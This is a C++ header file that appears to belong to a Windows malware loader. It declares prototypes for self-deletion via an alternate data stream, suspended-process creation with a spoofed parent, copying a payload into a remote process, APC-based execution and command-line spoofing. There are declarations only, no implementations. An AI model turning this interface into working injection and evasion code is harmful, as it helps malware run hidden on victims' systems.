#pragma once
#include <Windows.h>
#include <cstdint>
#include <iostream>
#include <tuple>
#include "Structures.hpp"
#include "defs.hpp"


bool DataStreamExploitDeleteFile(const wchar_t* FilePath);
std::tuple<HANDLE, HANDLE, std::uint32_t> CreateSuspendedProcess(const wchar_t* FilePath, _In_opt_ HANDLE Parent);
byte* RetrieveImageBase(HANDLE hProcess);
bool CopyPayloadIntoProcess(HANDLE hProcess, void* RemoteAddress, void* PayloadPtr, size_t PayloadSize);
bool QueueUserApcRunPayload(HANDLE hThread, void* RemoteAddress);
bool SpoofCommandLine(const wchar_t* NewCommandLine, HANDLE hProcess);


typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(

    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _Out_writes_bytes_(ProcessInformationLength) PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength,
    _Out_opt_ PULONG ReturnLength
);